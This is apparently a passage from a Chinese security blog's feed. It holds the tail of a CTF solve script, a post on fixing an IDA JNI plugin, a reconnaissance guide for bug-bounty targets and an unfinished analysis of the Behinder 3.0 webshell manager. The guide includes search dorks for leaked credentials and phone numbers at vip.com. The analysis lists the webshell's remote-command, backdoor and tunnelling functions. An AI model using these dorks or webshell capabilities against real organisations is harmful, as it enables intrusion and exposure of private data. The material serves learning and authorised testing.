class="hljs-number">179</span>, <span class="hljs-number">51</span>, <span class="hljs-number">78</span>, <span class="hljs-number">145</span>, <span class="hljs-number">65</span>, <span class="hljs-number">222</span>]<br><br>flag = <span class="hljs-string">b&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    flag += get_flag_bytes(flag_num[<span class="hljs-number">8</span>*i:(i+<span class="hljs-number">1</span>)*<span class="hljs-number">8</span>])<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDA插件JNI-Helper适配</title>
    <link href="/2021/11/19/IDA%E6%8F%92%E4%BB%B6JNI-Helper%E9%80%82%E9%85%8D/"/>
    <url>/2021/11/19/IDA%E6%8F%92%E4%BB%B6JNI-Helper%E9%80%82%E9%85%8D/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天打算把IDA搞得更智能一点，方便我这个懒人后面更快的进行分析工作。俗话说好事多磨，好工具的代码也需要多改才行。JNI_Helper这款插件，能满足我这个懒人自动修改JNI导出函数签名的目的，只是需要python2版本，并且存在代码还存在bug，另外自动化导出java native函数签名的方式也实在麻烦。为了满足我这个懒人刻薄的要求，那就只能自己动手改代码咯。项目地址:<a href="https://github.com/yougar0/AndroidReversePublicTools">https://github.com/yougar0/AndroidReversePublicTools</a></p><h2 id="JNI-Helper-py"><a href="#JNI-Helper-py" class="headerlink" title="JNI_Helper.py"></a>JNI_Helper.py</h2><p>这里先说下，我下载的版本是0.1，之所以使用这个版本是因为我看到这个版本的签名导出代码依赖jadx，因此这个版本最适合改造成gui形式的懒人插件。^-^</p><p>第一处是python3语法问题。</p><p><img src="/images/pasted-79.png" alt="python3语法问题"></p><p>第二处代码存在判断上的问题，经过本地实验，如果没有加载过jni.h，那么该函数会返回None，因此这里直接返回即可。</p><p><img src="/images/pasted-80.png" alt="判断问题"></p><p>第三处修改的地方如果没有加载过头文件，那就直接让IDA加载jni_headers目录下的jni.h文件，省心省事。</p><p><img src="/images/pasted-81.png" alt="直接加载jni_headers下的jni.h文件"></p><p>第四个是IDA7.4+的适配，这个参考文章最后给出的官方API适配文档。</p><p><img src="/images/pasted-82.png" alt="get_func_name适配"></p><p><img src="/images/pasted-83.png" alt="ask_file适配"></p><p>原来的程序当中存在一处bug，这里需要将变量名改成fname。</p><p><img src="/images/pasted-84.png" alt="bug修复"></p><p>最后是新增两处判断，原版程序由于这边没有判断用户点击取消不加载文件的结果，会出现代码异常的弹窗，导致用户体验不好，这里加上判断就不会有这些问题。</p><p><img src="/images/pasted-85.png" alt="新增判断1"></p><p><img src="/images/pasted-86.png" alt="新增判断2"></p><h2 id="jadx函数签名导出插件"><a href="#jadx函数签名导出插件" class="headerlink" title="jadx函数签名导出插件"></a>jadx函数签名导出插件</h2><p>为了使逆向的体验更好，效率更高，这里参考jadx官方的插件代码写了一个将JNIHelper集成进去的插件。代码全部来自jni_helper原作者，我这里只是做了插件形式的改造。</p><p>首先在MainWindow中新增一个Action调用，然后放到界面上显示。</p><p><img src="/images/pasted-95.png" alt="插件界面代码"></p><p><img src="/images/pasted-101.png" alt="添加到工具栏"></p><p><img src="/images/pasted-102.png" alt="添加到toolbar"></p><p>然后LazyJniAction的代码其实就是JniHelper的代码复制过去的，这个就不说了。</p><p>最后界面上就新增了一个插件了。</p><p><img src="/images/pasted-96.png" alt="界面显示内容"></p><h2 id="使用效果"><a href="#使用效果" class="headerlink" title="使用效果"></a>使用效果</h2><p>安装使用插件很简单，IDA插件只需要将jni_headers和jni_helper.py都复制到plugins目录下就可以了。</p><p><img src="/images/pasted-97.png" alt="IDA插件目录下的jni_headers"></p><p><img src="/images/pasted-98.png" alt="IDA插件目录下的jni_helper.py"></p><p>Jadx插件的话，稍微需要注意的是需要自己手动从头编译下修改后的源码才行，麻烦虽麻烦点，但最终效果是很好的，我们在打开apk文件后，只需要点击jni signature导出插件，就可以在apk所在目录下生成一个apk名字_jni_sign.json的jni函数签名文件了。</p><p><img src="/images/pasted-99.png" alt="LazyJni插件导出签名"></p><p><img src="/images/pasted-100.png" alt="签名文件路径与apk所在同一目录下"></p><p>最后使用ida中的jni_helper插件加载导出的函数签名json文件，就可以一键重命名jni导出函数了。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">idapython适配API官方文档</a></li><li><a href="https://evilpan.com/2020/10/07/jni-helper/">安卓逆向之自动化JNI静态分析</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SRC信息收集总结</title>
    <link href="/2021/11/15/SRC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/"/>
    <url>/2021/11/15/SRC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>信息收集是渗透测试当中最重要的环节，在SRC漏洞挖掘过程中，挖掘的漏洞的多少很大程度上取决于信息收集是否全面。SRC信息收集一般从5个方面入手，分别是公司架构、子域名、C段、APP和小程序以及PC客户端和微信公众号、文档源码账号。</p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h3 id="公司架构"><a href="#公司架构" class="headerlink" title="公司架构"></a>公司架构</h3><p>公司架构可以通过<code>爱查查、企查查、天眼查</code>这些企业关系图谱网站获得。以唯品会举例，通过爱企查等公司架构网站，查询得到唯品会的子公司、APP、公众号、微博等相关信息，对这些信息进行梳理，得到一部分数据。</p><p><img src="/images/pasted-66.png" alt="子公司查询结构"></p><p><img src="/images/pasted-67.png" alt="微博信息"></p><p><img src="/images/pasted-68.png" alt="微信公众号信息"></p><p><img src="/images/pasted-69.png" alt="APP信息"></p><p>使用狼组开源的EnScan自动化查询公司架构</p><p><img src="/images/pasted-70.png" alt="狼组ENScan"></p><p><img src="/images/pasted-71.png" alt="ENScan结果1"></p><p><img src="/images/pasted-72.png" alt="ENScan结果2"></p><p>通过工具，可以获取7个种分类的信息。</p><p>对获得的对外投资子公司进行批量查询，获得更多关于子公司的信息。</p><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p>子域名收集可以通过以下几方面来进行。</p><ul><li>证书</li><li>网页爬虫</li><li>DNS数据集服务接口</li><li>子域名爆破</li><li>威胁情报平台</li><li>搜索引擎搜索语法</li></ul><p>这里我采用两款工具进行收集，分别是OneForAll和JSINFO-SCAN。</p><ul><li>OneForAll: <a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></li><li>JSINFO-SCAN: <a href="https://github.com/p1g3/JSINFO-SCAN">https://github.com/p1g3/JSINFO-SCAN</a></li></ul><p>通过JSINFO-SCAN扫描爬取子域名和URL链接</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python3 jsinfo.py --target vip_domain.txt --keywords pinnuobaoxian,vpalstatic,ebatong,vpal,vipsfin,vip,weipinfin<br></code></pre></div></td></tr></table></figure><p><img src="/images/pasted-73.png" alt="JSINFO-SCAN扫描"></p><p>通过OneForAll获取子域名</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">python3 oneforall.py --targets ../JSINFO-SCAN/vip_domain.txt  run<br></code></pre></div></td></tr></table></figure><p><img src="/images/pasted-74.png" alt="OneForAll"></p><p>结合两个工具得到的子域名结果进行去重处理，剩下的就是发现的所有子域名。</p><h3 id="C段"><a href="#C段" class="headerlink" title="C段"></a>C段</h3><p>子域名去重结果</p><p><img src="/images/pasted-75.png" alt="去重后子域名"></p><p>对去重后的子域名进行泛解析检测、CDN检测以及C段提取，再调用FOFA API获取C段的所有开放的主机IP和端口。最后利用系统指纹、服务指纹探测工具探测端口的服务信息。</p><h3 id="APP、小程序、微信公众号、PC客户端"><a href="#APP、小程序、微信公众号、PC客户端" class="headerlink" title="APP、小程序、微信公众号、PC客户端"></a>APP、小程序、微信公众号、PC客户端</h3><p>在线查询网站</p><ul><li>小蓝本 <a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></li><li>爱企查</li><li>极致了 <a href="https://www.jzl.com/">https://www.jzl.com/</a></li><li>西瓜数据 <a href="http://data.xiguaji.com/">http://data.xiguaji.com/</a></li></ul><p><img src="/images/pasted-78.png" alt="小蓝本搜索"></p><p>微信直接搜索</p><p><img src="/images/pasted-76.png" alt="微信搜公众号"></p><p><img src="/images/pasted-77.png" alt="微信搜小程序"></p><h3 id="文档源码账号"><a href="#文档源码账号" class="headerlink" title="文档源码账号"></a>文档源码账号</h3><p>百度文库、文档、网盘敏感信息使用在线文档搜索网站，这里我用凌风云。</p><p>泄露源码可以从百度网盘、github、gitee搜索，github可以参考GSIL工具的API搜索语法，做到定时监控，自动搜索。gitee搜索使用google搜索语法进行，原因是gitee的站内搜索引擎实在是拉跨。</p><p>凭证泄露可以从github和gitee中搜索，也可以利用搜索引擎语法从互联网直接搜索。比如：</p><ul><li>site:vip.com intext:”忘记密码”</li><li>site:vip.com intext:”工号”</li><li>site:vip.com intext:”优秀员工”</li><li>site:vip.com intext:”xxx号码”</li><li>site:vip.com intext:”手机号”</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://wiki.wgpsec.org/knowledge/hw/border-info.html">https://wiki.wgpsec.org/knowledge/hw/border-info.html</a></li><li><a href="https://www.hui-blog.cool/posts/21385.html">https://www.hui-blog.cool/posts/21385.html</a></li><li><a href="https://www.hui-blog.cool/posts/15287.html">https://www.hui-blog.cool/posts/15287.html</a></li><li><a href="https://github.com/wgpsec/ENScan">https://github.com/wgpsec/ENScan</a></li><li><a href="https://xz.aliyun.com/t/10418">https://xz.aliyun.com/t/10418</a></li><li><a href="https://github.com/FeeiCN/GSIL/wiki">https://github.com/FeeiCN/GSIL/wiki</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WebShell管理工具冰蝎3.0分析</title>
    <link href="/2021/11/05/WebShell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E5%86%B0%E8%9D%8E3-0%E5%88%86%E6%9E%90/"/>
    <url>/2021/11/05/WebShell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E5%86%B0%E8%9D%8E3-0%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><ul><li>远程管理功能的实现细节，做到使用工具的过程中知其所以然。</li><li>二开</li></ul><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul><li>IDEA</li><li>tomcat</li><li>php</li><li>ASP</li><li>dnspy</li><li>3.0t00ls专版</li></ul><h2 id="源码获取"><a href="#源码获取" class="headerlink" title="源码获取"></a>源码获取</h2><p>通过使用IDEA自带的java反编译工具反编译冰蝎jar包获得java源码</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">java -cp /home/kali/Tools/idea-IC-212.5457.46/plugins/java-decompiler/lib/java-decompiler.jar  org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=<span class="hljs-literal">true</span> &lt;src.jar&gt; &lt;dest dir&gt;<br></code></pre></div></td></tr></table></figure><h2 id="结构分析"><a href="#结构分析" class="headerlink" title="结构分析"></a>结构分析</h2><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">net<br>└── rebeyond<br>    └── behinder<br>        ├── core <span class="hljs-comment"># 远程管理实现、加解密相关</span><br>        ├── dao  <span class="hljs-comment"># webshell连接信息数据管理</span><br>        ├── entity <span class="hljs-comment"># 文件、webshell、插件类信息</span><br>        ├── payload <span class="hljs-comment"># asp、jsp、php以及csharp的执行代码</span><br>        ├── resource <span class="hljs-comment"># 命令控制的dll、shellcode</span><br>        ├── ui <span class="hljs-comment"># 界面实现</span><br>        └── utils <span class="hljs-comment"># 封装的函数处理过程</span><br></code></pre></div></td></tr></table></figure><p>core目录存放的是项目的核心代码</p><p><img src="/images/pasted-63.png" alt="upload successful"></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">core<br>├── Constants.java <span class="hljs-comment"># 客户端版本信息 请求ua 其他常量数据</span><br>├── Crypt.java <span class="hljs-comment"># 加密代码</span><br>├── Decrypt.java <span class="hljs-comment"># 解密代码</span><br>├── Params.java <span class="hljs-comment"># 动态生成class数据</span><br>├── PluginResultCallBack.java <span class="hljs-comment"># 插件相关</span><br>├── PluginSubmitCallBack.java <span class="hljs-comment"># 插件相关</span><br>├── PluginTools.java <span class="hljs-comment"># 插件调用相关</span><br>└── ShellService.java <span class="hljs-comment"># 远程管理</span><br></code></pre></div></td></tr></table></figure><p><img src="/images/pasted-64.png" alt="upload successful"></p><p>ua信息可以修改成自定义的信息。</p><p><img src="/images/pasted-65.png" alt="upload successful"></p><p>解密jsp返回包用ECB，可以改成其他方式。</p><p>ShellService实现远程管理功能</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShellService</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String currentUrl;<br>    <span class="hljs-keyword">public</span> String currentPassword;<br>    <span class="hljs-keyword">public</span> String currentKey;<br>    <span class="hljs-keyword">public</span> String currentType;<br>    <span class="hljs-keyword">public</span> Map&lt;String, String&gt; currentHeaders;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> encryptType;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> beginIndex;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> endIndex;<br>    <span class="hljs-keyword">public</span> JSONObject shellEntity;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> BUFFSIZE = <span class="hljs-number">46080</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map&lt;String, Object&gt; currentProxy;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ShellService</span><span class="hljs-params">(JSONObject shellEntity)</span></span>; <span class="hljs-comment">// 初始化类</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">initHeaders</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">// 初始化请求头</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> String <span class="hljs-title">getReferer</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">// 生成refer信息</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> String <span class="hljs-title">getCurrentUserAgent</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">// 从Constants里面随机选择一个UA</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setProxy</span><span class="hljs-params">(Map&lt;String, Object&gt; proxy)</span></span>; <span class="hljs-comment">// 赋值代理信息</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map&lt;String, Object&gt; <span class="hljs-title">getProxy</span><span class="hljs-params">(Map&lt;String, Object&gt; proxy)</span></span>; <span class="hljs-comment">// 获取代理信息</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">getShellEntity</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">// 获取当前shell实体信息</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">mergeCookie</span><span class="hljs-params">(Map&lt;String, String&gt; headers, String cookie)</span></span>; <span class="hljs-comment">// 合并用户设置的cookie</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">mergeHeaders</span><span class="hljs-params">(Map&lt;String, String&gt; headers, String headerTxt)</span></span>; <span class="hljs-comment">// 合并用户设置的请求头</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> String <span class="hljs-title">formatHeaderName</span><span class="hljs-params">(String beforeName)</span></span>; <span class="hljs-comment">// 格式化header数据</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">doConnect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 连接WebShell</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">eval</span><span class="hljs-params">(String sourceCode)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 执行用户输入的代码</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">runCmd</span><span class="hljs-params">(String cmd, String path)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 命令执行</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">createBShell</span><span class="hljs-params">(String target, String localPort)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 创建本地监听后门</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">sendBShellCommand</span><span class="hljs-params">(String target, String action, String actionParams)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 发送后门命令</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">submitPluginTask</span><span class="hljs-params">(String taskID, String payloadPath, Map&lt;String, String&gt; pluginParams)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 提交插件任务</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">getPluginTaskResult</span><span class="hljs-params">(String taskID)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 获取插件任务结果</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">loadJar</span><span class="hljs-params">(String libPath)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 直接加载jar包</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">createRealCMD</span><span class="hljs-params">(String bashPath)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 创建交互式cmd进程</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">stopRealCMD</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 停止交互式cmd进程</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">readRealCMD</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 读取交互式cmd进程输出</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">writeRealCMD</span><span class="hljs-params">(String cmd)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 发送命令到交互式cmd进程</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">listFiles</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 列举路径下文件</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">getTimeStamp</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 获取文件时间戳</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">updateTimeStamp</span><span class="hljs-params">(String path, String createTimeStamp, String modifyTimeStamp, String accessTimeStamp)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 更新文件的创建、修改、访问时间</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">updateModifyTimeStamp</span><span class="hljs-params">(String path, String modifyTimeStamp)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 更新文件的修改时间</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">deleteFile</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 删除文件</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">showFile</span><span class="hljs-params">(String path, String charset)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 查看文件</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">renameFile</span><span class="hljs-params">(String oldName, String newName)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 重命名文件</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">createFile</span><span class="hljs-params">(String fileName)</span> <span class="hljs-keyword">throws</span> Exception</span>;<span class="hljs-comment">// 创建文件</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">createDirectory</span><span class="hljs-params">(String dirName)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 创建目录</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">downloadFile</span><span class="hljs-params">(String remotePath, String localPath)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 下载文件</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">execSQL</span><span class="hljs-params">(String type, String host, String port, String user, String pass, String database, String sql)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 执行SQL语句</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">uploadFile</span><span class="hljs-params">(String remotePath, <span class="hljs-keyword">byte</span>[] fileContent, <span class="hljs-keyword">boolean</span> useBlock)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 可选择阻塞、非阻塞模式的上传文件</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">uploadFile</span><span class="hljs-params">(String remotePath, <span class="hljs-keyword">byte</span>[] fileContent)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 上传文件</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">appendFile</span><span class="hljs-params">(String remotePath, <span class="hljs-keyword">byte</span>[] fileContent)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 追加文件</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">createRemotePortMap</span><span class="hljs-params">(String targetIP, String targetPort, String remoteIP, String remotePort)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 创建远程端口转发</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">createRemoteSocks</span><span class="hljs-params">(String targetIP, String targetPort, String remoteIP, String remotePort)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 创建远程流量转发</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">createVPSSocks</span><span class="hljs-params">(String remoteIP, String remotePort)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 开启转发VPS流量</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> JSONObject <span class="hljs-title">stopVPSSocks</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 停止转发VPS流量</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">createPortMap</span><span class="hljs-params">(String targetIP, String targetPort, String socketHash)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 创建端口转发</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">byte</span>[] readPortMapData(String targetIP, String targetPort, String socketHash) <span class="hljs-keyword">throws</span> Exception; <span class="hljs-comment">// 读取端口转发来的数据</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">writePortMapData</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] proxyData, String targetIP, String targetPort, String socketHash)</span> <span class="hljs-keyword">throws</span> Exception</span>; <span class="hljs-comment">// 发送端口转发数据</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span 